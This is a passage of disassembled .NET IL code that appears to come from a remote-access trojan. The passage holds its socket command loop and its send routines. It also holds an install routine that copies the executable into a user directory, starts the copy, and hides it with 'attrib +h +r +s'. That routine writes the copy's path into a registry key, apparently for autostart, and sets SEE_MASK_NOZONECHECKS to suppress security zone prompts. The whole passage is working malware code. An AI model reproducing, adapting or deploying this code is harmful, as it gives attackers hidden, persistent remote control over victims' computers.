      IL_012e:  sub.ovf
      IL_012f:  conv.ovf.i4
      IL_0130:  ldc.i4.1
      IL_0131:  add.ovf
      IL_0132:  ldc.i4.1
      IL_0133:  sub.ovf
      IL_0134:  ldc.i4.1
      IL_0135:  add.ovf
      IL_0136:  newarr     [mscorlib]System.Byte
      IL_013b:  stsfld     uint8[] L::b
      IL_0140:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_0145:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_014a:  ldsfld     uint8[] L::b
      IL_014f:  ldc.i4.0
      IL_0150:  ldsfld     uint8[] L::b
      IL_0155:  ldlen
      IL_0156:  conv.ovf.i4
      IL_0157:  ldc.i4.0
      IL_0158:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_015d:  stloc.2
      IL_015e:  ldsfld     class [mscorlib]System.IO.MemoryStream L::MeM
      IL_0163:  ldsfld     uint8[] L::b
      IL_0168:  ldc.i4.0
      IL_0169:  ldloc.2
      IL_016a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_016f:  ldsfld     class [mscorlib]System.IO.MemoryStream L::MeM
      IL_0174:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0179:  ldloc.0
      IL_017a:  bne.un     IL_0019

      IL_017f:  ldc.i4.m1
      IL_0180:  conv.i8
      IL_0181:  stloc.0
      IL_0182:  ldnull
      IL_0183:  ldftn      void L::LOP(object)
      IL_0189:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_018e:  ldc.i4.1
      IL_018f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0194:  stloc.s    V_6
      IL_0196:  ldloc.s    V_6
      IL_0198:  ldsfld     class [mscorlib]System.IO.MemoryStream L::MeM
      IL_019d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_01a2:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_01a7:  ldloc.s    V_6
      IL_01a9:  ldc.i4.s   100
      IL_01ab:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_01b0:  pop
      IL_01b1:  ldsfld     class [mscorlib]System.IO.MemoryStream L::MeM
      IL_01b6:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01bb:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01c0:  stsfld     class [mscorlib]System.IO.MemoryStream L::MeM
      IL_01c5:  br         IL_0019

      IL_01ca:  leave.s    IL_01eb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01cc:  dup
      IL_01cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d2:  stloc.s    V_7
      IL_01d4:  ldloc.s    V_7
      IL_01d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01db:  ldloc.s    V_7
      IL_01dd:  stloc.s    V_8
      IL_01df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e9:  leave.s    IL_01eb

    }  // end handler
    IL_01eb:  nop
    .try
    {
      IL_01ec:  ldsfld     object L::PLG
      IL_01f1:  brfalse.s  IL_0219

      IL_01f3:  ldsfld     object L::PLG
      IL_01f8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01fd:  ldnull
      IL_01fe:  ldstr      "clear"
      IL_0203:  ldc.i4.0
      IL_0204:  newarr     [mscorlib]System.Object
      IL_0209:  ldnull
      IL_020a:  ldnull
      IL_020b:  ldnull
      IL_020c:  ldc.i4.1
      IL_020d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0212:  pop
      IL_0213:  ldnull
      IL_0214:  stsfld     object L::PLG
      IL_0219:  leave.s    IL_023a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_021b:  dup
      IL_021c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0221:  stloc.s    V_10
      IL_0223:  ldloc.s    V_10
      IL_0225:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_022a:  ldloc.s    V_10
      IL_022c:  stloc.s    V_9
      IL_022e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0233:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0238:  leave.s    IL_023a

    }  // end handler
    IL_023a:  ldc.i4.0
    IL_023b:  stsfld     bool L::Cn
    IL_0240:  call       bool L::connect()
    IL_0245:  brtrue.s   IL_0249

    IL_0247:  br.s       IL_01eb

    IL_0249:  ldc.i4.1
    IL_024a:  stsfld     bool L::Cn
    IL_024f:  br         IL_0000
  } // end of method L::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // 
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method L::SB

  .method public static bool  Send(string S) cil managed
  {
    // 
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] L::SB(string&)
    IL_0007:  call       bool L::Sendb(uint8[])
    IL_000c:  ret
  } // end of method L::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // 
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             uint8[] V_2,
             int32 V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.IO.FileInfo V_9,
             string V_10)
    IL_0000:  ldsfld     bool L::Cn
    IL_0005:  brtrue.s   IL_0009

    IL_0007:  ldc.i4.0
    IL_0008:  ret

    .try
    {
      IL_0009:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  stloc.s    V_9
      IL_0012:  ldloc.s    V_9
      IL_0014:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0019:  ldsfld     bool L::Cn
        IL_001e:  brtrue.s   IL_0027

        IL_0020:  ldc.i4.0
        IL_0021:  stloc.0
        IL_0022:  leave      IL_00ef

        IL_0027:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002c:  stloc.s    V_4
        IL_002e:  ldarg.0
        IL_002f:  ldlen
        IL_0030:  conv.ovf.i4
        IL_0031:  stloc.3
        IL_0032:  ldloca.s   V_3
        IL_0034:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0039:  ldstr      bytearray (00 00 ) 
        IL_003e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0043:  stloc.s    V_10
        IL_0045:  ldloca.s   V_10
        IL_0047:  call       uint8[] L::SB(string&)
        IL_004c:  stloc.2
        IL_004d:  ldloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldc.i4.0
        IL_0051:  ldloc.2
        IL_0052:  ldlen
        IL_0053:  conv.ovf.i4
        IL_0054:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0059:  ldloc.s    V_4
        IL_005b:  ldarg.0
        IL_005c:  ldc.i4.0
        IL_005d:  ldarg.0
        IL_005e:  ldlen
        IL_005f:  conv.ovf.i4
        IL_0060:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0065:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_006a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_006f:  ldloc.s    V_4
        IL_0071:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0076:  ldc.i4.0
        IL_0077:  ldloc.s    V_4
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_00e9

      }  // end .try
      finally
      {
        IL_0088:  ldloc.s    V_9
        IL_008a:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008f:  endfinally
      }  // end handler
      IL_0090:  leave.s    IL_00e9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0092:  dup
      IL_0093:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0098:  stloc.s    V_5
      IL_009a:  ldloc.s    V_5
      IL_009c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a1:  ldloc.s    V_5
      IL_00a3:  stloc.s    V_6
      .try
      {
        IL_00a5:  ldsfld     bool L::Cn
        IL_00aa:  brfalse.s  IL_00bc

        IL_00ac:  ldc.i4.0
        IL_00ad:  stsfld     bool L::Cn
        IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
        IL_00b7:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00bc:  leave.s    IL_00dd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00be:  dup
        IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c4:  stloc.s    V_8
        IL_00c6:  ldloc.s    V_8
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00cd:  ldloc.s    V_8
        IL_00cf:  stloc.s    V_7
        IL_00d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00db:  leave.s    IL_00dd

      }  // end handler
      IL_00dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e7:  leave.s    IL_00e9

    }  // end handler
    IL_00e9:  ldsfld     bool L::Cn
    IL_00ee:  ret

    IL_00ef:  ldloc.0
    IL_00f0:  ret
  } // end of method L::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // 
    .maxstack  4
    .locals init (bool V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string L::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0034:  ldarg.2
      IL_0035:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_003a:  ldc.i4.1
      IL_003b:  stloc.0
      IL_003c:  leave.s    IL_005b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  dup
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  stloc.2
      IL_0045:  ldloc.2
      IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004b:  ldloc.2
      IL_004c:  stloc.3
      IL_004d:  ldc.i4.0
      IL_004e:  stloc.0
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  leave.s    IL_005b

    }  // end handler
    IL_005b:  ldloc.0
    IL_005c:  ret
  } // end of method L::STV

  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // 
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  ldc.i4.0
    IL_001d:  bne.un.s   IL_0071

    IL_001f:  ldarg.0
    IL_0020:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0025:  stloc.1
    IL_0026:  ldarg.1
    IL_0027:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002c:  stloc.2
    IL_002d:  ldloc.1
    IL_002e:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0033:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0038:  ldloc.2
    IL_0039:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003e:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0043:  ldc.i4.0
    IL_0044:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0049:  ldc.i4.0
    IL_004a:  beq.s      IL_004e

    IL_004c:  ldc.i4.0
    IL_004d:  ret

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_0069

    IL_0067:  ldc.i4.1
    IL_0068:  ret

    IL_0069:  ldloc.1
    IL_006a:  brtrue.s   IL_006e

    IL_006c:  ldc.i4.0
    IL_006d:  ret

    IL_006e:  ldloc.2
    IL_006f:  brtrue.s   IL_002d

    IL_0071:  ldc.i4.0
    IL_0072:  ret
  } // end of method L::CompDir

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // 
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15)
    IL_0000:  ldsfld     bool L::Idr
    IL_0005:  brfalse    IL_0175

    IL_000a:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
    IL_000f:  ldsfld     string L::DR
    IL_0014:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0019:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_001e:  ldstr      "\\"
    IL_0023:  ldsfld     string L::EXE
    IL_0028:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0032:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0037:  call       bool L::CompDir(class [mscorlib]System.IO.FileInfo,
                                         class [mscorlib]System.IO.FileInfo)
    IL_003c:  brtrue     IL_0175

    .try
    {
      IL_0041:  ldsfld     string L::DR
      IL_0046:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_004b:  ldstr      "\\"
      IL_0050:  ldsfld     string L::EXE
      IL_0055:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005a:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_005f:  brfalse.s  IL_007f

      IL_0061:  ldsfld     string L::DR
      IL_0066:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_006b:  ldstr      "\\"
      IL_0070:  ldsfld     string L::EXE
      IL_0075:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_007a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_007f:  ldsfld     string L::DR
      IL_0084:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0089:  ldstr      "\\"
      IL_008e:  ldsfld     string L::EXE
      IL_0093:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0098:  ldc.i4.1
      IL_0099:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_009e:  stloc.1
      IL_009f:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_00a4:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00a9:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00ae:  stloc.0
      IL_00af:  ldloc.1
      IL_00b0:  ldloc.0
      IL_00b1:  ldc.i4.0
      IL_00b2:  ldloc.0
      IL_00b3:  ldlen
      IL_00b4:  conv.ovf.i4
      IL_00b5:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00ba:  ldloc.1
      IL_00bb:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00c0:  ldloc.1
      IL_00c1:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00c6:  ldsfld     string L::DR
      IL_00cb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d0:  ldstr      "\\"
      IL_00d5:  ldsfld     string L::EXE
      IL_00da:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00df:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00e4:  stsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_00e9:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_00ee:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00f3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_00f8:  pop
      IL_00f9:  ldstr      "attrib +h +r +s \""
      IL_00fe:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_0103:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0108:  ldstr      "\""
      IL_010d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0112:  ldc.i4.0
      IL_0113:  ldc.i4.0
      IL_0114:  ldc.i4.m1
      IL_0115:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_011a:  pop
      IL_011b:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0120:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0125:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_012a:  ldsfld     string L::sf
      IL_012f:  ldc.i4.1
      IL_0130:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0135:  ldsfld     string L::RG
      IL_013a:  ldstr      "2"
      IL_013f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0144:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_0149:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_014e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0158:  leave.s    IL_0175

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015a:  dup
      IL_015b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0160:  stloc.2
      IL_0161:  ldloc.2
      IL_0162:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0167:  ldloc.2
      IL_0168:  stloc.3
      IL_0169:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_016e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0173:  leave.s    IL_0175

    }  // end handler
    .try
    {
      IL_0175:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_017a:  ldstr      "1"
      IL_017f:  ldc.i4.1
      IL_0180:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0185:  leave.s    IL_01a6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0187:  dup
      IL_0188:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_018d:  stloc.s    V_5
      IL_018f:  ldloc.s    V_5
      IL_0191:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0196:  ldloc.s    V_5
      IL_0198:  stloc.s    V_4
      IL_019a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_019f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a4:  leave.s    IL_01a6

    }  // end handler
    IL_01a6:  ldsfld     bool L::Isu
    IL_01ab:  brfalse    IL_0258

    .try
    {
      IL_01b0:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_01b5:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01ba:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01bf:  ldsfld     string L::sf
      IL_01c4:  ldc.i4.1
      IL_01c5:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01ca:  ldsfld     string L::RG
      IL_01cf:  ldstr      "2"
      IL_01d4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01d9:  ldsfld     string L::rgg
      IL_01de:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01e3:  leave.s    IL_0204

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e5:  dup
      IL_01e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01eb:  stloc.s    V_7
      IL_01ed:  ldloc.s    V_7
      IL_01ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f4:  ldloc.s    V_7
      IL_01f6:  stloc.s    V_6
      IL_01f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0202:  leave.s    IL_0204

    }  // end handler
    .try
    {
      IL_0204:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_0209:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_020e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0213:  ldsfld     string L::sf
      IL_0218:  ldc.i4.1
      IL_0219:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_021e:  ldsfld     string L::RG
      IL_0223:  ldstr      "2"
      IL_0228:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_022d:  ldsfld     string L::rgg
      IL_0232:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0237:  leave.s    IL_0258

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0239:  dup
      IL_023a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023f:  stloc.s    V_8
      IL_0241:  ldloc.s    V_8
      IL_0243:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0248:  ldloc.s    V_8
      IL_024a:  stloc.s    V_9
      IL_024c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0251:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0256:  leave.s    IL_0258

    }  // end handler
